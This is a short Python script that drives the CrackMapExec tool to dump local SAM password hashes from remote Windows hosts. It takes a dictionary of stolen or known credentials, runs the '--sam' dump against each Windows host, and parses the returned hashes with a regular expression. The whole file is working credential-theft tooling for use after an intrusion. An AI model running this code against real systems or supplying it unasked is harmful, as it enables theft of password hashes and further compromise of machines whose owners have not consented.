import subprocess as sp
import re


# assumes it receives a list of Windows hosts with corresponding password and username
# input: str,str,str
# output: list(str)
def sam_hash(host, username, password, t=100):
	brute_result = sp.run(['crackmapexec', '-t', str(t), host, '-u', username, '-p', password, '--local-auth', '--sam'], universal_newlines=True, stdout=sp.PIPE)
	output = examine(brute_result)
	if len(output) != 0:
		return output
	return None


def examine(brute_result):
	found = False
	result = []
	for res in brute_result.stdout.splitlines():
		if 'Dumping' in res:
			found = True
		if found:
			if '[*] KTHXBYE!' in res:
				return result
			shash = re.search(' ([\w]+):([\d]+):([\w]+):::', res).group(0)
			result.append(shash)
	return result


# input: dict(hostname: (username, password, service))
# output: list(str)
def run(cred_dict):
	result = []
	for host in (host for host in cred_dict.keys() if 'windows' in cred_dict[host][2]):
		res = sam_hash(host, cred_dict[host][0], cred_dict[host][1])
		if res is not None:
			result = result+res
	return result
